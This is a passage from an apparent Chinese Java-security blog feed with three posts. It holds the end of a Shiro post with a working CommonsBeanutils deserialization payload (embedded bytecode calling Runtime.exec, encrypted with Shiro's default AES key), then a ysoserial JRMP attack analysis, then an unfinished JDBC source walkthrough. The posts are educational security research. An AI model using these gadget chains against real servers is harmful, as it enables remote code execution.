nN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAKAAQACwANAAwACwAAAAwAAQAAAA4ADAANAAAADgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAAQAAsAAAAgAAMAAAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAEAAAAAbEAAAACAAoAAAAGAAEAAAATAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZAAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;B1uel0n3&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>,String.CASE_INSENSITIVE_ORDER);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,beanComparator);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queueArray=(Object[]) getValue(queue,<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>]=templates;</span><br><span class="line">        queueArray[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line"></span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span>[] key = java.util.Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(barr.toByteArray(), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String filedname, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object obj, String filedname)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field=obj.getClass().getDeclaredField(filedname);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/2f569ddd/image-20250921164442296.png" alt="image-20250921164442296"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java JRMP</title>
      <link href="/archives/890809c3/"/>
      <url>/archives/890809c3/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Java Remote Method Protocol，Java远程方法协议。</p><p>RMI依赖的通信协议为JRMP，该协议用于查找和引用远程对象，是运行在RMI之下、TCP&#x2F;IP之上的线路层协议。</p><p>一个RMI的过程，需要用到JRMP这个协议去组织数据格式然后通过TCP进行传输、从而达到调用远程方法的目的。</p><p>当服务端与客户端之间通过socket建立连接，其中通信的协议就是通过JRMP协议格式来进行通信的</p><p>JRMP接口的两种常见实现方法：</p><ul><li>JRMP协议(Java Remote Message Protocol)：RMI专用的Java远程消息交换协议</li><li>IIOP协议(Internet Inter-ORB Protocol)，基于CORBA实现的对象请求代理协议</li></ul><h2 id="DGCImpl-Stub和DGCImpl-Skel"><a href="#DGCImpl-Stub和DGCImpl-Skel" class="headerlink" title="DGCImpl_Stub和DGCImpl_Skel"></a>DGCImpl_Stub和DGCImpl_Skel</h2><p>前面我们在利用RMI攻击时都是围绕着RegistryImpl_Stub和RegistryImpl_Skel之间来讲的</p><p>而其中还有一种JRMP的攻击没有进行讲解，前面我们在将DGC分布式垃圾回收的时候也讲过，在执行RegistryImpl_Stub.lookup方法中，在接受服务端的返回值后会通过done的后续调用创建DGCImpl_Stub，并调用DGCImpl_Stub.dirty方法，该方法中同样会调用invoke进行传输然后将返回内容进行反序列化。</p><p>而处理请求对应于DGCImpl_Skel.dispatch方法，当DGC调用完DGCImpl_Stub.dirty方法，DGCImpl_Skel.dispatch会处理这个方法的请求，其中同样存在反序列化，还原lease对象</p><p><img src="/archives/890809c3/image-20250714103238259.png" alt="image-20250714103238259"></p><p><img src="/archives/890809c3/image-20250714103250423.png" alt="image-20250714103250423"></p><p>0对应处理clean请求，1对应处理dirty请求</p><h2 id="ysoserial程序分析"><a href="#ysoserial程序分析" class="headerlink" title="ysoserial程序分析"></a>ysoserial程序分析</h2><p>在ysoserial中有exploit模块和payload模块，每个模块下都有JRMPClient和JRMPListener的脚本，对应着两种攻击方式</p><h3 id="payloads-JRMPListener-exploit-JRMPClient"><a href="#payloads-JRMPListener-exploit-JRMPClient" class="headerlink" title="payloads&#x2F;JRMPListener+exploit&#x2F;JRMPClient"></a>payloads&#x2F;JRMPListener+exploit&#x2F;JRMPClient</h3><p>第一种方法是基于RMI反序列化的客户端打服务器类型。通过将一个payload（JRMPListener）发送到存在漏洞的服务器，存在漏洞的服务器反序列化该payload（JRMPListener）后在指定端口开启RMI监听，然后再通过exploit（JRMPClient）去发送利用链载荷，最终在存在漏洞的服务器上进行反序列化操作实现攻击。</p><p>我们从代码的角度上来分析，先看ysoserial.payloads.JRMPListener的利用链：</p><p><img src="/archives/890809c3/image-20250714112159717.png" alt="image-20250714112159717"></p><p>跟过远程对象创建的师傅们应该都比较熟悉这个链子，链子后面不就是创建远程对象的部分过程吗，只不过是通过UnicastRemoteObject.readObject这个反序列化入口来进行的：</p><p><img src="/archives/890809c3/image-20250714113032025.png" alt="image-20250714113032025"></p><p>调用UnicastRemoteObject.reexport()方法：</p><p><img src="/archives/890809c3/image-20250714113252896.png" alt="image-20250714113252896"></p><p>接着调用UnicastRemoteObject.exportObject()方法，后面就是创建远程对象时的流程了，后面将封装好的target对象通过exportObject发布出去，其中会调用listen()方法创建socket并开启监听等待连接</p><p>看一下ysoserial的操作，先看一下继承链：</p><p><img src="/Java-JRMP/https%253A%252F%252Fs3-us-west-2.amazonaws.com%252Fsecure.notion-static.com%252F805fbcb9-610f-48c8-afcc-377200212011%252FUntitled.png" alt="img"></p><p>在ysoserial中用到了UnicastRemoteObject的子类ActivationGroupImpl</p><p><img src="/archives/890809c3/image-20250714170826255.png" alt="image-20250714170826255"></p><p>调用了Reflections.createWithConstructor方法，这是自定义的方法，有四个参数，跟进下：<br><img src="/archives/890809c3/image-20250714171049034.png" alt="image-20250714171049034"></p><p>逻辑大概就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">uro</span> <span class="operator">=</span> RemoteObject.class.getDeclaredConstructor(RemoteRef.class);</span><br><span class="line">uro.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Constructor sc= ReflectionFactory.getReflectionFactory().newConstructorForSerialization(ActivationGroupImpl.class,uro);</span><br><span class="line">sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">UnicastRemoteObject</span> <span class="variable">u</span> <span class="operator">=</span> (UnicastRemoteObject) sc.newInstance(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line"></span><br><span class="line">Field field=UnicastRemoteObject.class.getDeclaredField(<span class="string">&quot;port&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(u,port);</span><br></pre></td></tr></table></figure><p>先获取RemoteObject的私有构造器，参数为RemoteRef对象：</p><p><img src="/archives/890809c3/image-20250714173353292.png" alt="image-20250714173353292"></p><p>然后调用ReflectionFactory.getReflectionFactory()获取ReflectionFactory对象，再调用newConstructorForSerialization方法来获取构造方法，这里将ActivationGroupImpl的序列化构造行为劫持到RemoteObject的构造器，这样能绕过JVM对构造器的安全检测，同时获取到ActivationGroupImpl对象后，向上转型就能获取到UnicastRemoteObject，避免了直接实例化UnicastRemoteObject对象直接触发监听。</p><p>之所以选择<code>ActivationGroupImpl</code>是因为在继承链中，<code>ActivationGroupImpl</code> 是 RMI 中<strong>唯一同时满足</strong>：</p><ul><li>非抽象类</li><li>继承自 <code>UnicastRemoteObject</code></li><li>在标准JDK中预加载（避免 ClassNotFoundException）</li><li>实现 <code>Serializable</code> 接口</li></ul><p><img src="/archives/890809c3/image-20250714173647058.png" alt="image-20250714173647058"></p><p><img src="/archives/890809c3/image-20250714174016127.png" alt="image-20250714174016127"></p><p>对这个构造方法调用newInstance(new UnicastServerRef(port)方法来实例化远程对象，传入了UnicastServerRef</p><p><img src="/archives/890809c3/image-20250714221933974.png" alt="image-20250714221933974"></p><p>当反序列化UnicastRemoteObject对象字节流，就会触发它的构造方法，从而在指点端口开启监听</p><p>当正常对UnicastRemoteObject反序列化，会发现端口并不是指定的，而是一个随机端口，所以需要通过反射指定端口</p><p>最后返回UnicastRemoteObject对象</p><p>此时将payload&#x2F;JRMPListener注入到服务器后就已经开启了RMI服务，我们就可以通过exploit&#x2F;JRMPClient发送gadgets来进行利用了（前提对方存在可以利用的gadgets），先看ysoserial：</p><p><img src="/archives/890809c3/image-20250714222706451.png" alt="image-20250714222706451"></p><p>意思是其攻击手法大致与 <strong>{@link RMIRegistryExploit} 相同</strong>，只不过：</p><ul><li><strong>攻击目标</strong> 是远程 DGC（分布式垃圾回收服务——<strong>只要存在远程对象监听，该服务必然存在</strong>）</li><li><strong>不执行反序列化操作</strong>（避免自身被反制 )</li></ul><p>在RMIRegistryExploit中我们主要目标是攻击rmi的Registry模块，这里是攻击DGC，且该操作不执行反序列化操作，它Client全都是向server发送数据，没有接受过任何来自server端的数据，这样自己就不会被反制了。</p><p>前面在讲DGC时也说过，当为RMI注册端口时，TableObject就存在有DGC了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(PORT);</span><br></pre></td></tr></table></figure><p>在ysoserial中，exploit&#x2F;JRMPClient调用了makeDGCCall:</p><p><img src="/archives/890809c3/image-20250714224004009.png" alt="image-20250714224004009"></p><p>主要是为了调用dirty方法触发反序列化，传递一个用于反序列化的对象导致命令执行</p><p><img src="/archives/890809c3/image-20250714234955660.png" alt="image-20250714234955660"></p><p>而这种客户端打服务端的方式虽然也是二次反序列化，但比较鸡肋，因为本身就是一个反序列化的点，结果还需要再去开个rmi服务，然后再次进行攻击，这就显得没必要，且后面存在jep290的限制，但这个二次反序列化可以起到绕过黑名单的效果</p><h3 id="payloads-JRMPClient-exploit-JRMPListener"><a href="#payloads-JRMPClient-exploit-JRMPListener" class="headerlink" title="payloads&#x2F;JRMPClient+exploit&#x2F;JRMPListener"></a>payloads&#x2F;JRMPClient+exploit&#x2F;JRMPListener</h3><p>这种就类似于服务端打客户端类型，同样也是二次反序列化，也有绕过黑名单的作用。且这种服务端打客户端的类型比客户端打服务端的类型更加常用，它一方面能外连，另一方面能绕过jep290的限制。</p><p>先看payloads&#x2F;JRMPClient：</p><p><img src="/archives/890809c3/image-20250715093200802.png" alt="image-20250715093200802"></p><p><img src="/archives/890809c3/image-20250715094225114.png" alt="image-20250715094225114"></p><p>反序列化UnicastRef类</p><p>UnicastRef实现了RemoteRef接口，RemoteRef接口又实现了Externalizable接口，Externalizable接口又实现Serializable</p><p>Externalizable接口定义了writeExternal和readExternal方法，用于实现序列化和反序列化</p><p><img src="/archives/890809c3/image-20250715094755303.png" alt="image-20250715094755303"></p><p>UnicastRef.readExternl方法：</p><p><img src="/archives/890809c3/image-20250715094828709.png" alt="image-20250715094828709"></p><p>调用对序列化数据流调用LiveRef.read方法：</p><p><img src="/archives/890809c3/image-20250715095020321.png" alt="image-20250715095020321"></p><p>useNewFormat为false，会调用TCPEndpoint.readHostPortFormat(in)方法：</p><p><img src="/archives/890809c3/image-20250715095255973.png" alt="image-20250715095255973"></p><p>通过输入流来获取host和port，返回一个封装了host和port的TCPEndpoint对象</p><p><img src="/archives/890809c3/image-20250715095503834.png" alt="image-20250715095503834"></p><p>然后创建一个LiveRef对象将ObjId、host、port等信息封装进去</p><p>而如果我们控制输入流不为ConnectionInputStream类，那么就会调用<code>DGCClient.registerRefs(ep, Arrays.asList(new LiveRef[] &#123; ref &#125;));</code>方法：</p><p><img src="/archives/890809c3/image-20250715095838748.png" alt="image-20250715095838748"></p><p>首先会执行一次EndpointEntry.lookup(ep)方法，返回EndpointEntry对象，然后会调用EndpointEntry.registerRefs方法：</p><p><img src="/archives/890809c3/image-20250715100226147.png" alt="image-20250715100226147"></p><p>EndpointEntry.registerRefs最后会调用一次makeDirtyCall方法，跟进：</p><p><img src="/archives/890809c3/image-20250715100357536-17525450385901.png" alt="image-20250715100357536"></p><p>可以看到会调用dirty方法，实际上是调用DGCImpl_Stub.dirty方法，这个方法下调用newCall方法建立连接，还会对remoteCall进行一次反序列化</p><p>在注册远程对象时，利用RemoteObjectInvocationHandler来为UnicastRef创建动态代理，这个过程类似于RMI创建远程对象的部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">        Registry.class</span><br><span class="line">    &#125;, obj);</span><br></pre></td></tr></table></figure><p>还需要一个UnicastRef对象：<br><img src="/archives/890809c3/image-20250715102940937.png" alt="image-20250715102940937"></p><p>需要LiveRef对象对host、port、ObjId等远程标识对象进行封装：</p><p><img src="/archives/890809c3/image-20250715103300367.png" alt="image-20250715103300367"></p><p>所以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ObjID</span> <span class="variable">objID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());</span><br><span class="line"><span class="type">Endpoint</span> <span class="variable">endpoint</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Endpoint</span>(host,port);</span><br><span class="line">UnicastRef u=<span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(objID, endpoint, <span class="literal">false</span>));</span><br></pre></td></tr></table></figure><p>所以payloads&#x2F;JRMPClient主要功能就是生成一个向指定攻击机IP和端口发起RMI通信。</p><p>再看exploit&#x2F;JRMPListener：</p><p>就是一个通用JRMP侦听器，大致逻辑就是打开一个JRMP侦听器，该侦听器会将指定的有效负载传递给连接到它并进行调用的任何客户端。</p><p>ysoserial中，获取一个用于反序列化对象：</p><p><img src="/archives/890809c3/image-20250715104532368.png" alt="image-20250715104532368"></p><p>这样当客户端向exploit&#x2F;JRMPListener进行连接时，就会返回一个序列化对象，客户端接受对象后会进行反序列化等操作，而这个恶意对象就是这里payloadObject</p><p>所以这个攻击手法整体的流程就是通过在受害机找到反序列化注入点，然后将payloads&#x2F;JRMPClient写入，其反序列化时会与攻击机建立RMI通信，攻击机开启监听后生成第二次反序列化的payload，返回恶意对象，受害机收到对象后会进行反序列化造成攻击</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/zpchcbd/p/14934168.html">https://www.cnblogs.com/zpchcbd/p/14934168.html</a></p><p><a href="https://xz.aliyun.com/news/6860">https://xz.aliyun.com/news/6860</a></p><p><a href="https://xz.aliyun.com/news/6675">https://xz.aliyun.com/news/6675</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> java安全 </category>
          
          <category> Java基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JRMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java JDBC注入深度解析</title>
      <link href="/archives/2de96424/"/>
      <url>/archives/2de96424/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Java Database Connetivity，Java数据库连接，是Java提供对数据库进行连接、操作的标准API。</p><h2 id="相关类和接口"><a href="#相关类和接口" class="headerlink" title="相关类和接口"></a>相关类和接口</h2><ul><li><p>java.sql.DriverManager</p><p>Java通过java.sql.DriverManager来管理所用数据库的驱动注册，提供getConnection方法来连接数据库</p></li><li><p>java.sql.Driver</p><p>负责实现对数据库的连接，所以数据库驱动包都必须实现这个接口才能完成数据库连接操作</p></li><li><p>jva.sql.Connection</p><p>通过java.sql.DriverManager.getConnection方法成功连接数据库后，会返回一个java.sql.Connection数据库连接对象，一切对数据库的查询操作都将依赖于这个对象</p></li></ul><h2 id="JDBC-Demo"><a href="#JDBC-Demo" class="headerlink" title="JDBC Demo"></a>JDBC Demo</h2><p>先开启mysql环境</p><p>JDBC连接数据库的一般步骤：</p><ul><li>注册驱动</li><li>获取连接</li></ul><p>先添加依赖：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;<span class="number">5.1</span><span class="number">.28</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JDBC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/dvwa&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//简单查询</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        statement.execute(<span class="string">&quot;select * from users&quot;</span>);</span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">set</span> <span class="operator">=</span> statement.getResultSet();</span><br><span class="line">        <span class="keyword">while</span> (set.next()) &#123;</span><br><span class="line">            System.out.println(set.getString(<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        statement.close();</span><br><span class="line">        connection.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<code>jdbc:mysql://</code>表示要连接的数据库类型mysql，<code>localhost:3306</code>为mysql服务地址，<code>dvwa</code>为数据库名。简单查询中2表示查询的列索引，即第2列</p><p><img src="/archives/2de96424/image-20250721171513927-17589753289641.png" alt="image-20250721171513927"></p><p><img src="/archives/2de96424/image-20250721171455259-17589753289652.png" alt="image-20250721171455259"></p><h2 id="SPI机制"><a href="#SPI机制" class="headerlink" title="SPI机制"></a>SPI机制</h2><p>Service Provider Interface，是JDK内置的一种服务提供发现机制，可以用来启动框架扩展和替换组建。服务提供接口，不同厂商可以针对同一个接口做出不同的实现。当服务提供者提供了一种接口的实现之后，需要在classpath下的<code>META-INF/services/</code>目录下创建一个以服务接口命名的文件，文件内容就是这个接口的具体实现类，当程序需要这个服务时，就可以通过查找这个jar包的<code>META-INF/services/</code>中的配置文件，配置文件中有接口的具体实现类名，可以根据这个类名进行加载实例化。</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>环境：mysql-connector-java 5.1.28</p><h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">Class.forName(CLASS_NAME);</span><br></pre></td></tr></table></figure><p>也可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverManager.registerDirver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br></pre></td></tr></table></figure><p>下面我们跟下代码看下究竟怎么实现的</p><p>当JVM加载<code>com.mysql.jdbc.Driver</code>类到内存中时会自动触发其静态初始代码块：</p><p><img src="/archives/2de96424/image-20250722095938767-17589753289653.png" alt="image-20250722095938767"></p><p>调用<code>java.sql.DriverManager.registerDriver(new Driver());</code>方法来注册驱动，要注册的驱动即是com.mysql.jdbc.Driver对象：<br><img src="/archives/2de96424/image-20250722100354401-17589753289654.png" alt="image-20250722100354401"></p><p>调用另一个重载方法registerDriver:</p><p><img src="/archives/2de96424/image-20250722100446929-17589753289655.png" alt="image-20250722100446929"></p><p>方法中实例化了一个DriverInfo对象用来存放驱动类信息。</p><p>registeredDrivers是DriverManager对象的一个变量，通过addIfAbsent方法，将DriverInfo对象信息存放进registeredDrivers变量中</p><h3 id="获取连接"><a href="#获取连接" class="headerlink" title="获取连接"></a>获取连接</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/dvwa&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure><p>跟进getConnection方法：</p><p><img src="/archives/2de96424/image-20250722100813489-17589753289656.png" alt="image-20250722100813489"></p><p>其中<code>Reflection.getCallerClass()</code>用于获取调用者的类，即在运行时确定正在调用该方法的类的名称，返回一个Class对象，比如我这里是JDBC.test</p><p>跟进getConnection重载方法：</p><p><img src="/archives/2de96424/image-20250722101324169-17589753289657.png" alt="image-20250722101324169"></p><p>先获取类加载器</p><p><img src="/archives/2de96424/image-20250722101544077-17589753289658.png" alt="image-20250722101544077"></p><p>遍历registeredDrivers变量的值，里面存放着我们注册过的驱动，随即通过DriverInfo对象获取对应驱动</p><p>然后就是通过获取的驱动，调用其connet方法进行连接，由于驱动com.mysql.jdbc.Driver没有该方法，所以调用父类NonRegisteringDriver.connect方法：</p><p><img src="/archives/2de96424/image-20250722102826264-17531513072751-17589753289659.png" alt="image-20250722102826264"></p><p>先对 URL 前缀进行判断，判断成功直接路由到专用方法</p><p>再通过<code>parseURL()</code>将 URL 和 info 合并解析为统一的 Properties 对象:</p><p><img src="/archives/2de96424/image-20250722103120132-175897532896510.png" alt="image-20250722103120132"></p><p><code>NUM_HOSTS_PROPERTY_KEY</code>表示 URL 中配置的主机数量，如果主机数大于1就调用connectFailover处理故障转移场景</p><p>最后调用<code>com.mysql.jdbc.ConnectionImpl.getInstance</code>方法获取连接：</p><p><img src="/archives/2de96424/image-20250722103621450-175897532896511.png" alt="image-20250722103621450"></p><p>这部分逻辑就是判断JDBC版本是否在4以上，JDBC4以上调用Util.handleNewInstance通过反射动态创建增强版连接对象，<code>JDBC_4_CONNECTION_CTOR</code>静态常量指向<code>com.mysql.jdbc.JDBC4Connection</code> 的构造函数，最后返回Connection对象：</p><p><img src="/archives/2de96424/image-20250722104231643-175897532896612.png" alt="image-20250722104231643"></p><p>handleNewInstance用于反射实例化</p><p>相当于调用JDBC4Connection.newInstance(args)，传入参数为创建连接的信息如主机名端口等等：</p><p><img src="/archives/2de96424/image-20250722104500314-17531523012163-175897532896613.png" alt="image-20250722104500314"></p><p>会调用父类ConnetionImpl的构造方法：</p><p><img src="/archives/2de96424/image-20250722104830188-175897532896614.png" alt="image-20250722104830188"></p><p>获取主机名，端口，数据库名等信息</p><p><img 